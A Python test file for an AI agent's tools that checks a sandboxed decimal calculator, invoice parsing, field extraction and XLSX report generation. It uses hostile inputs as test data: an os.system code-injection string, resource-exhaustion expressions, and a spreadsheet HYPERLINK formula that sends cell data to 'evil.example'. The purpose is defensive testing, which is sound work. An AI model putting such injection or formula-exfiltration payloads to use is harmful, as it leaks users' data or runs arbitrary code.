import io
import time
import uuid
from decimal import Decimal

import pytest
from openpyxl import load_workbook
from pydantic import JsonValue

from app.agent.numbers import CalcError, calculate, extract_fields, parse_amount
from app.agent.tools import TOOLS, ReportArgs, SheetIn, build_xlsx
from app.llm.providers import to_openai


@pytest.mark.parametrize(
    ("expr", "want"),
    [
        ("0.1 + 0.2", "0.3"),
        ("sum([1200.50, 300.00]) - 99.99", "1400.51"),
        ("max(1, 2.5, -3)", "2.5"),
        ("round(10 / 3, 2)", "3.33"),
        ("-(2 * 3) + abs(-4)", "-2"),
        ("sum(1, [2, 3])", "6"),
    ],
)
def test_calculate_is_exact_decimal(expr: str, want: str) -> None:
    assert calculate(expr) == Decimal(want)


@pytest.mark.parametrize(
    "expr",
    [
        "__import__('os').system('echo hi')",
        "2 ** 100000",
        "x + 1",
        "(1).__class__",
        "open('f')",
        "1 / 0",
        "[1, 2]",
        "'a' * 3",
        "1j",
        "sum()",
        "lambda: 1",
        "+".join(["1"] * 500),
        # S6: each of these froze the worker in C code (GIL held) before the bounds.
        "round(1, 1e999999)",
        "round(1, 1e9999999)",
        "round(1, 2.5)",
        "10**10**10",
        "1" * 3999,
        "0." + "0" * 3990 + "1",
        "*".join(["1e99"] * 100),
        "-" * 3000 + "1",
    ],
)
def test_calculate_rejects_everything_else(expr: str) -> None:
    with pytest.raises(CalcError):
        calculate(expr)


@pytest.mark.parametrize(
    ("raw", "want"),
    [
        ("1,234.56", "1234.56"),
        ("1.234,56", "1234.56"),
        ("1'234.5", "1234.5"),
        ("1 234,50", "1234.50"),
        ("1,234", "1234"),
        ("12", "12"),
    ],
)
def test_parse_amount(raw: str, want: str) -> None:
    assert parse_amount(raw) == Decimal(want)


def test_extract_fields_prefers_the_total_line() -> None:
    f = extract_fields(
        "Invoice No: A-7\nSubtotal: 10\nShipping: USD 5.00\nTotal: USD 1,015.00\nDate: 31/12/2024"
    )
    assert (f["invoice_number"], f["currency"], f["amount"], f["date"]) == (
        "A-7",
        "USD",
        "1015.00",
        "2024-12-31",
    )


@pytest.mark.parametrize(
    "text",
    [
        "\n" * 100_000,
        "Total: 1" + " " * 100_000 + "x",
        "1 " * 100_000,
        "1," * 100_000,
        "Total: " + "9" * 100_000,
    ],
)
def test_extract_fields_is_linear_on_pathological_text(text: str) -> None:
    t0 = time.perf_counter()
    extract_fields(text)
    assert time.perf_counter() - t0 < 2  # quadratic before: minutes at this size


def test_extract_fields_reads_amounts_after_the_fix() -> None:
    assert extract_fields("Total: 450.10 USD")["amount"] == "450.10"
    assert extract_fields("Total:\t \r\n EUR 1.200,50  \r\n")["amount"] == "1200.50"
    assert extract_fields("Fee: -5 USD")["amount"] == "-5"


def test_xlsx_cells_are_never_formulas() -> None:
    evil = '=HYPERLINK("http://evil.example/?d="&B2,"Total")'
    sheet = SheetIn(title="T", columns=[evil, "+1", "amount"], rows=[[evil, "@SUM(A1)", "12.50"]])
    args = ReportArgs(name="r", sheets=[sheet], source_chunk_ids=[uuid.uuid4()])
    src: list[dict[str, JsonValue]] = [
        {"chunk_id": "c", "document_name": "-2+3", "loc": "=1", "text": "\t=cmd"}
    ]
    wb = load_workbook(io.BytesIO(build_xlsx(args, src)))
    cells = [c for ws in wb for row in ws.iter_rows() for c in row]
    assert all(c.data_type != "f" for c in cells)
    t = wb["T"]
    assert (t["A1"].value, t["A1"].data_type) == (evil, "s")
    assert (t["A2"].value, t["B2"].value, t["C2"].value) == (evil, "@SUM(A1)", Decimal("12.50"))
    assert t["C2"].data_type == "n" and wb["Sources"]["C2"].value == "=1"


def test_tool_schemas_forbid_extra_fields() -> None:
    for tool in TOOLS.values():
        assert tool.spec.input_schema.get("additionalProperties") is False, tool.name
    assert {t.name: t.risk for t in TOOLS.values()} == {
        "search_knowledge": "read",
        "read_chunks": "read",
        "calculate": "read",
        "extract_table": "read",
        "create_xlsx_report": "reversible_write",
        "delete_report": "irreversible_write",
    }


def test_openai_transcript_conversion() -> None:
    msgs = to_openai(
        [
            {"role": "user", "content": [{"type": "text", "text": "goal"}]},
            {
                "role": "assistant",
                "content": [
                    {"type": "thinking", "thinking": ""},
                    {"type": "text", "text": "plan"},
                    {
                        "type": "tool_use",
                        "id": "t1",
                        "name": "calculate",
                        "input": {"expression": "1+1"},
                    },
                ],
            },
            {
                "role": "user",
                "content": [{"type": "tool_result", "tool_use_id": "t1", "content": "{}"}],
            },
        ],
        "sys",
    )
    assert msgs == [
        {"role": "system", "content": "sys"},
        {"role": "user", "content": "goal"},
        {
            "role": "assistant",
            "content": "plan",
            "tool_calls": [
                {
                    "id": "t1",
                    "type": "function",
                    "function": {"name": "calculate", "arguments": '{"expression": "1+1"}'},
                }
            ],
        },
        {"role": "tool", "tool_call_id": "t1", "content": "{}"},
    ]
